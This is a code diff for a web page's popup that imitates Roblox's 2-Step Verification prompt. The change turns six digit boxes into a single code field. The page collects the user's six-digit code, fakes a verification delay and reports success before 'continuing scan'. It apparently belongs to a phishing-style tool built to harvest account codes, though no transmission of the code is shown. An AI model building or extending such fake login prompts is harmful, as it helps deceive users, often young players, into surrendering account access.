@@ -646,116 +646,74 @@ function showRoblox2StepAuth() {
     if (popup) {
         popup.style.display = 'flex';
         setTimeout(() => {
-            setupCodeInputs();
-            const firstInput = popup.querySelector('.roblox-code-digit[data-index="0"]');
-            if (firstInput) {
-                firstInput.focus();
+            const codeInput = document.getElementById('robloxVerificationCode');
+            if (codeInput) {
+                codeInput.focus();
+                
+                // Add event listeners
+                codeInput.addEventListener('keydown', (e) => {
+                    if (e.key === 'Enter') {
+                        submitRobloxAuth();
+                    }
+                });
+                
+                codeInput.addEventListener('input', (e) => {
+                    // Only allow numbers
+                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                });
             }
         }, 100);
     }
 }
 
-function setupCodeInputs() {
-    const inputs = document.querySelectorAll('.roblox-code-digit');
-    
-    inputs.forEach((input, index) => {
-        input.addEventListener('input', (e) => {
-            const value = e.target.value;
-            
-            // Only allow numbers
-            if (!/^\d*$/.test(value)) {
-                e.target.value = '';
-                return;
-            }
-            
-            // Move to next input if this one is filled
-            if (value && index < inputs.length - 1) {
-                inputs[index + 1].focus();
-            }
-        });
-        
-        input.addEventListener('keydown', (e) => {
-            // Handle backspace
-            if (e.key === 'Backspace' && !input.value && index > 0) {
-                inputs[index - 1].focus();
-            }
-            
-            // Handle Enter key
-            if (e.key === 'Enter') {
-                submitRobloxAuth();
-            }
-        });
-        
-        input.addEventListener('paste', (e) => {
-            e.preventDefault();
-            const pastedData = e.clipboardData.getData('text');
-            const digits = pastedData.replace(/\D/g, '').slice(0, 6);
-            
-            // Fill all inputs with pasted digits
-            inputs.forEach((inp, idx) => {
-                inp.value = digits[idx] || '';
-            });
-            
-            // Focus last filled input or submit if complete
-            if (digits.length === 6) {
-                submitRobloxAuth();
-            } else if (digits.length > 0) {
-                const lastFilledIndex = Math.min(digits.length - 1, inputs.length - 1);
-                inputs[lastFilledIndex].focus();
-            }
-        });
-    });
-}
-
 function closeRobloxAuth() {
     const popup = document.getElementById('roblox2StepPopup');
-    const inputs = document.querySelectorAll('.roblox-code-digit');
+    const codeInput = document.getElementById('robloxVerificationCode');
     
     if (popup) {
         popup.style.display = 'none';
     }
     
-    // Clear all inputs
-    inputs.forEach(input => {
-        input.value = '';
-    });
+    if (codeInput) {
+        codeInput.value = '';
+    }
 }
 
 function submitRobloxAuth() {
-    const inputs = document.querySelectorAll('.roblox-code-digit');
-    const code = Array.from(inputs).map(input => input.value).join('');
+    const codeInput = document.getElementById('robloxVerificationCode');
+    const code = codeInput ? codeInput.value.trim() : '';
     
     if (code.length !== 6) {
-        showNotification('Please enter a complete 6-digit code', 'error');
+        showNotification('Please enter a 6-digit verification code', 'error');
         return;
     }
     
     // Show "verifying" state
-    const submitBtn = document.querySelector('.roblox-btn-verify');
+    const submitBtn = document.querySelector('.roblox-verify-btn');
     if (submitBtn) {
         submitBtn.textContent = 'Verifying...';
         submitBtn.disabled = true;
     }
     
-    // Disable all inputs
-    inputs.forEach(input => {
-        input.disabled = true;
-    });
+    // Disable input
+    if (codeInput) {
+        codeInput.disabled = true;
+    }
     
     // Simulate verification delay
     setTimeout(() => {
         closeRobloxAuth();
         showNotification('2-Step Verification successful! Continuing scan...', 'success');
         
-        // Reset button and inputs
+        // Reset button and input
         if (submitBtn) {
             submitBtn.textContent = 'Verify';
             submitBtn.disabled = false;
         }
-        inputs.forEach(input => {
-            input.disabled = false;
-        });
-    }, 2500);
+        if (codeInput) {
+            codeInput.disabled = false;
+        }
+    }, 2000);
 }
 
 // Loading animation with dots and messages
